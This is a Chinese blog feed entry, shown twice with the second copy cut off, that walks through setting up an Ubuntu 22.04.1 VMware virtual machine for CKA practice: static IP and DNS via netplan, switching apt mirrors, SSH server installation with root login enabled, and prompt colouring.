    <link href="/2022/11/21/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91(202211)%20VMware16.2.2%E4%B8%AD%E5%88%9B%E5%BB%BAubuntu22.04.1%E8%99%9A%E6%8B%9F%E6%9C%BA+%E4%BF%AE%E6%94%B9%E9%9D%99%E6%80%81ip+%E6%8D%A2%E6%BA%90+mobaxterm%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5+%E4%BF%AE%E6%94%B9%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6%E9%A2%9C%E8%89%B2(cka%E8%80%83%E8%AF%95%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%90%AD%E5%BB%BA)/"/>
    <url>/2022/11/21/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91(202211)%20VMware16.2.2%E4%B8%AD%E5%88%9B%E5%BB%BAubuntu22.04.1%E8%99%9A%E6%8B%9F%E6%9C%BA+%E4%BF%AE%E6%94%B9%E9%9D%99%E6%80%81ip+%E6%8D%A2%E6%BA%90+mobaxterm%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5+%E4%BF%AE%E6%94%B9%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6%E9%A2%9C%E8%89%B2(cka%E8%80%83%E8%AF%95%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%90%AD%E5%BB%BA)/</url>
    
    <content type="html"><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>镜像：<a href="https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/22.04.1/ubuntu-22.04.1-desktop-amd64.isohttps://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/22.04.1/">https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/22.04.1/ubuntu-22.04.1-desktop-amd64.isohttps://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/22.04.1/</a>    </p><p>vmware：16.2.2</p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol><li>创建虚新的虚拟机</li></ol><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185354.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185445.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185633.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185651.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185718.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185750.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185804.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185816.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185832.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185917.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185842.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185935.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121190003.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121190013.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121190027.png"></p><p>配置完参数之后，系统开始安装，如下所示：</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121190802.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121190938.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121191146.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121191231.png"></p><p>此处可以把Download updates while installing ubuntu 关掉，不关的话，网不好，会导致虚拟机安装卡在某一个地方一动不动</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121191417.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121191443.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121191533.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121191722.png"></p><p>开始了漫长的安装<br>19:17-19:47  安装好啦</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121194733.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121194935.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121195042.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121195104.png"></p><h2 id="进阶1"><a href="#进阶1" class="headerlink" title="进阶1"></a>进阶1</h2><h3 id="dns无法解析"><a href="#dns无法解析" class="headerlink" title="dns无法解析"></a>dns无法解析</h3><p>发现虚拟机解析不了域名，域名不能访问，ip可以访问(ip是通过一台正常的虚拟机解析出来的，下面第2张图)</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121220718.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121220751.png"></p><p>查看网关，ping网关是没有问题的</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121221838.png"></p><p>查看&#x2F;etc&#x2F;resolv.conf文件，发现没有可用的dns服务器<br>在这个文件中添加dns服务器的话，每次重启就会被刷成之前的配置</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121231402.png"></p><p>我们采用修改静态ip的办法，顺便把dns加上</p><h3 id="修改静态ip"><a href="#修改静态ip" class="headerlink" title="修改静态ip"></a>修改静态ip</h3><p>查看网卡配置</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121230356.png"></p><p>这是没有修改之前的网卡配置</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121230424.png"></p><p>修改&#x2F;etc&#x2F;netplan&#x2F;01-network-manager-all.yaml文件，如下所示：</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121230443.png"></p><p>执行：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">netplan <span class="hljs-built_in">apply</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121230608.png"></p><p>注释掉renderer<br>(如果没加renderer也报这个错，再次执行netplan apply就ok了)</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121231048.png"></p><p>查看ip地址，已经成功更改~</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121231118.png"></p><p>再次ping域名，已经没有问题啦~</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121231237.png"></p><p>yaml文件如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ubuntu-22:~<span class="hljs-comment"># cat /etc/netplan/01-network-manager-all.yaml</span><br>network:<br>  ethernets:<br>    ens33:<br>      dhcp4: no<br>      dhcp6: no<br>      addresses:<br>        - 192.168.1.100/24<br>      routes:<br>        - to: default<br>          via: 192.168.1.2<br>      nameservers:<br>        addresses:<br>          - 114.114.114.114<br>          - 8.8.8.8<br>  version: 2<br>  <span class="hljs-comment">#renderer: networkd</span><br><br></code></pre></td></tr></table></figure><h3 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h3><p>想要下载一个vim，发现下载不了</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121231937.png"></p><p>换源操作来一波</p><p>Ubuntu 的软件源配置文件是 &#x2F;etc&#x2F;apt&#x2F;sources.list</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>备份原始源文件source.list <br>sudo <span class="hljs-built_in">cp</span> /etc/apt/sources.list /etc/apt/sources.list.bak<br> <br>修改源文件sources.list  中科大ubuntu 22.04镜像<br>sudo <span class="hljs-built_in">cat</span> &lt;&lt; <span class="hljs-string">EOF &gt; /etc/apt/sources.list</span><br><span class="hljs-string">deb https://mirrors.ustc.edu.cn/ubuntu/ jammy main restricted universe multiverse</span><br><span class="hljs-string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy main restricted universe multiverse</span><br><span class="hljs-string">deb https://mirrors.ustc.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse</span><br><span class="hljs-string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse</span><br><span class="hljs-string">deb https://mirrors.ustc.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse</span><br><span class="hljs-string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse</span><br><span class="hljs-string">deb https://mirrors.ustc.edu.cn/ubuntu/ jammy-security main restricted universe multiverse</span><br><span class="hljs-string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-security main restricted universe multiverse</span><br><span class="hljs-string">deb https://mirrors.ustc.edu.cn/ubuntu/ jammy-proposed main restricted universe multiverse</span><br><span class="hljs-string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-proposed main restricted universe multiverse</span><br><span class="hljs-string">EOF</span><br><br><br>apt update<br></code></pre></td></tr></table></figure><p>update之后，可以顺畅下载vim了</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121232236.png"></p><h2 id="进阶2"><a href="#进阶2" class="headerlink" title="进阶2"></a>进阶2</h2><h3 id="远程连接"><a href="#远程连接" class="headerlink" title="远程连接"></a>远程连接</h3><h4 id="普通用户连接"><a href="#普通用户连接" class="headerlink" title="普通用户连接"></a>普通用户连接</h4><p>ubuntu  都原生有了ssh客户端，可以通过ssh 命令检验.</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121234308.png"></p><p>远程连接的服务器端没有自带，需要自行安装，命令为：</p><p>sudo apt install openssh-server</p><p>检查ssh是否成功启动</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle"> <span class="hljs-regexp">/etc/i</span>nit.d/ssh status<br> systemctl status ssh<br>ps -e | <span class="hljs-keyword">grep</span> sshd<br></code></pre></td></tr></table></figure><p>远程连接，可以成功连接</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> username<span class="hljs-variable">@ip</span><br></code></pre></td></tr></table></figure><p>这个是cmd的远程连接</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121233518.png"></p><p>这个是mobaxterm的远程连接</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121233608.png"></p><h4 id="root连接"><a href="#root连接" class="headerlink" title="root连接"></a>root连接</h4><p>刚刚是普通用户的连接，此时root用户还是无法连接</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121233654.png"></p><p>Ubuntu中SSH服务安装完成后查看是否允许root用户登陆，若不允许则无法远程登陆root用户，需要修改配置</p><p>打开“&#x2F;etc&#x2F;ssh&#x2F;sshd_config”</p><p>sudo vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config</p><p>找到并用#注释掉这行：PermitRootLogin prohibit-password</p><p>查看是否有“PermitRootLogin yes”新建一行 添加：PermitRootLogin yes</p><p>重启服务</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/i</span>nit.d/ssh restart<br>sudo systemctl restart ssh<br></code></pre></td></tr></table></figure><p>测试了一下，还是连不上</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121233948.png"></p><h4 id="修改root密码"><a href="#修改root密码" class="headerlink" title="修改root密码"></a>修改root密码</h4><p>Ubuntu的 默认root密码是随机的，即每次开机都有一个新的root密码。我们可以在终端输入命令 sudo passwd，然后输入当前用户的密码， enter，</p><p>终端会提示我们输入新的密码并确认，此时的密码就是root新密码。修改成功后，输入命令 su root，再输入新的密码就ok了。</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121234148.png"></p><p>再次使用root连接，发现就可以成功连接了</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121234119.png"></p><h2 id="进阶3"><a href="#进阶3" class="headerlink" title="进阶3"></a>进阶3</h2><h3 id="修改终端命令提示符颜色"><a href="#修改终端命令提示符颜色" class="headerlink" title="修改终端命令提示符颜色"></a>修改终端命令提示符颜色</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim ~/.bashrc<br>PS1=<span class="hljs-string">&#x27;\[\e[32;40m\][\u@\h \W]\$\[\e[0m\] &#x27;</span>  <span class="hljs-comment"># green</span><br>PS1=<span class="hljs-string">&#x27;\[\e[34;40m\][\u@\h \W]\$\[\e[0m\] &#x27;</span>  <span class="hljs-comment">#blue</span><br><span class="hljs-built_in">source</span> ~/.bashrc<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221128220437.png"></p><p>可以看到，终端已经变成了绿色。详细说明可以参考附件的资料。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://blog.csdn.net/xiangxianghehe/article/details/122856771">Ubuntu 22.04换国内源 清华源 阿里源 中科大源 163源</a><br><a href="https://blog.csdn.net/howiecode/article/details/120457571">ubuntu首次SSH使用root账户远程登录教程</a><br><a href="https://blog.csdn.net/weixin_42072280/article/details/112536544?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166964433816782429786434%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=166964433816782429786434&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-112536544-null-null.nonecase&utm_term=%E7%BB%88%E7%AB%AF&spm=1018.2226.3001.4450"># Xshell Linux centOS命令提示符改颜色</a></p>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ubuntu</tag>
      
      <tag>cka</tag>
      
      <tag>net</tag>
      
      <tag>vmware</tag>
      
      <tag>mobaxterm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【虚拟机】(202211) VMware16.2.2中创建ubuntu22.04.1虚拟机+修改静态ip+换源+mobaxterm远程连接+修改命令提示符颜色(cka考试虚拟机搭建)</title>
    <link href="/2022/11/21/net/%E3%80%90%E8%99%9A%E6%8B%9F%E6%9C%BA%E3%80%91(202211)%20VMware16.2.2%E4%B8%AD%E5%88%9B%E5%BB%BAubuntu22.04.1%E8%99%9A%E6%8B%9F%E6%9C%BA+%E4%BF%AE%E6%94%B9%E9%9D%99%E6%80%81ip+%E6%8D%A2%E6%BA%90+mobaxterm%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5+%E4%BF%AE%E6%94%B9%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6%E9%A2%9C%E8%89%B2(cka%E8%80%83%E8%AF%95%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%90%AD%E5%BB%BA)/"/>
    <url>/2022/11/21/net/%E3%80%90%E8%99%9A%E6%8B%9F%E6%9C%BA%E3%80%91(202211)%20VMware16.2.2%E4%B8%AD%E5%88%9B%E5%BB%BAubuntu22.04.1%E8%99%9A%E6%8B%9F%E6%9C%BA+%E4%BF%AE%E6%94%B9%E9%9D%99%E6%80%81ip+%E6%8D%A2%E6%BA%90+mobaxterm%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5+%E4%BF%AE%E6%94%B9%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6%E9%A2%9C%E8%89%B2(cka%E8%80%83%E8%AF%95%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%90%AD%E5%BB%BA)/</url>
    
    <content type="html"><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>镜像：<a href="https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/22.04.1/ubuntu-22.04.1-desktop-amd64.isohttps://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/22.04.1/">https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/22.04.1/ubuntu-22.04.1-desktop-amd64.isohttps://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/22.04.1/</a>    </p><p>vmware：16.2.2</p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol><li>创建虚新的虚拟机</li></ol><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185354.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185445.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185633.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185651.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185718.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185750.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185804.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185816.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185832.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185917.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185842.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185935.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121190003.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121190013.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121190027.png"></p><p>配置完参数之后，系统开始安装，如下所示：</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121190802.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121190938.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121191146.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121191231.png"></p><p>此处可以把Download updates while installing ubuntu 关掉，不关的话，网不好，会导致虚拟机安装卡在某一个地方一动不动</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121191417.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121191443.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121191533.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121191722.png"></p><p>开始了漫长的安装<br>19:17-19:47  安装好啦</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121194733.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121194935.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121195042.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121195104.png"></p><h2 id="进阶1"><a href="#进阶1" class="headerlink" title="进阶1"></a>进阶1</h2><h3 id="dns无法解析"><a href="#dns无法解析" class="headerlink" title="dns无法解析"></a>dns无法解析</h3><p>发现虚拟机解析不了域名，域名不能访问，ip可以访问(ip是通过一台正常的虚拟机解析出来的，下面第2张图)</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121220718.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121220751.png"></p><p>查看网关，ping网关是没有问题的</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121221838.png"></p><p>查看&#x2F;etc&#x2F;resolv.conf文件，发现没有可用的dns服务器<br>在这个文件中添加dns服务器的话，每次重启就会被刷成之前的配置</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121231402.png"></p><p>我们采用修改静态ip的办法，顺便把dns加上</p><h3 id="修改静态ip"><a href="#修改静态ip" class="headerlink" title="修改静态ip"></a>修改静态ip</h3><p>查看网卡配置</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121230356.png"></p><p>这是没有修改之前的网卡配置</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121230424.png"></p><p>修改&#x2F;etc&#x2F;netplan&#x2F;01-network-manager-all.yaml文件，如下所示：</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121230443.png"></p><p>执行：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">netplan <span class="hljs-built_in">apply</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121230608.png"></p><p>注释掉renderer<br>(如果没加renderer也报这个错，再次执行netplan apply就ok了)</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121231048.png"></p><p>查看ip地址，已经成功更改~</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121231118.png"></p><p>再次ping域名，已经没有问题啦~</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121231237.png"></p><p>yaml文件如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ubuntu-22:~<span class="hljs-comment"># cat /etc/netplan/01-network-manager-all.yaml</span><br>network:<br>  ethernets:<br>    ens33:<br>      dhcp4: no<br>      dhcp6: no<br>      addresses:<br>        - 192.168.1.100/24<br>      routes:<br>        - to: default<br>          via: 192.168.1.2<br>      nameservers:<br>        addresses:<br>          - 114.114.114.114<br>          - 8.8.8.8<br>  version: 2<br>  <span class="hljs-comment">#renderer: networkd</span><br><br></code></pre></td></tr></table></figure><h3 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h3><p>想要下载一个vim，发现下载不了</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121231937.png"></p><p>换源操作来一波</p><p>Ubuntu 的软件源配置文件是 &#x2F;etc&#x2F;apt&#x2F;sources.list</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>备份原始源文件source.list <br>sudo <span class="hljs-built_in">cp</span> /etc/apt/sources.list /etc/apt/sources.list.bak<br> <br>修改源文件sources.list  中科大ubuntu 22.04镜像<br>sudo <span class="hljs-built_in">cat</span> &lt;&lt; <span class="hljs-string">EOF &gt; /etc/apt/sources.list</span><br><span class="hljs-string">deb https://mirrors.ustc.edu.cn/ubuntu/ jammy main restricted universe multiverse</span><br><span class="hljs-string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy main restricted universe multiverse</span><br><span class="hljs-string">deb https://mirrors.ustc.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse</span><br><span class="hljs-string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse</span><br><span class="hljs-string">deb https://mirrors.ustc.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse</span><br><span class="hljs-string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse</span><br><span class="hljs-string">deb https://mirrors.ustc.edu.cn/ubuntu/ jammy-security main restricted universe multiverse</span><br><span class="hljs-string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-security main restricted universe multiverse</span><br><span class="hljs-string">deb https://mirrors.ustc.edu.cn/ubuntu/ jammy-proposed main restricted universe multiverse</span><br><span class="hljs-string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-proposed main restricted universe multiverse</span><br><span class="hljs-string">EOF</span><br><br><br>apt update<br></code></pre></td></tr></table></figure><p>update之后，可以顺畅下载vim了</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121232236.png"></p><h2 id="进阶2"><a href="#进阶2" class="headerlink" title="进阶2"></a>进阶2</h2><h3 id="远程连接"><a href="#远程连接" class="headerlink" title="远程连接"></a>远程连接</h3><h4 id="普通用户连接"><a href="#普通用户连接" class="headerlink" title="普通用户连接"></a>普通用户连接</h4><p>ubuntu  都原生有了ssh客户端，可以通过ssh 命令检验.</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121234308.png"></p><p>远程连接的服务器端没有自带，需要自行安装，命令为：</p><p>sudo apt install openssh-server</p><p>检查ssh是否成功启动</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle"> <span class="hljs-regexp">/etc/i</span>nit.d/ssh status<br> systemctl status ssh<br>ps -e | <span class="hljs-keyword">grep</span> sshd<br></code></pre></td></tr></table></figure><p>远程连接，可以成功连接</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> username<span class="hljs-variable">@ip</span><br></code></pre></td></tr></table></figure><p>这个是cmd的远程连接</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121233518.png"></p><p>这个是mobaxterm的远程连接</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121233608.png"></p><h4 id="root连接"><a href="#root连接" class="headerlink" title="root连接"></a>root连接</h4><p>刚刚是普通用户的连接，此时root用户还是无法连接</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121233654.png"></p><p>Ubuntu中SSH服务安装完成后查看是否允许root用户登陆，若不允许则无法远程登陆root用户，需要修改配置</p><p>打开“&#x2F;etc&#x2F;ssh&#x2F;sshd_config”</p><p>sudo vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config</p><p>找到并用#注释掉这行：PermitRootLogin prohibit-password</p><p>查看是否有“PermitRootLogin yes”新建一行 添加：PermitRootLogin yes</p><p>重启服务</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/i</span>nit.d/ssh restart<br>sudo systemctl restart ssh<br></code></pre></td></tr></table></figure><p>测试了一下，还是连不上</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121233948.png"></p><h4 id="修改root密码"><a href="#修改root密码" class="headerlink" title="修改root密码"></a>修改root密码</h4><p>Ubuntu的 默认root密码是随机的，即每次开机都有一个新的root密码。我们可以在终端输入命令 sudo passwd，然后输入当前用户的密码， enter，</p><p>终端会提示我们输入新的密码并确认，此时的密码就是root新密码。修改成功后，输入命令 su root，再输入新的密码就ok了。</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121234148.png"></p><p>再次使用root连接，发现就可以成功连接了</p><p><img 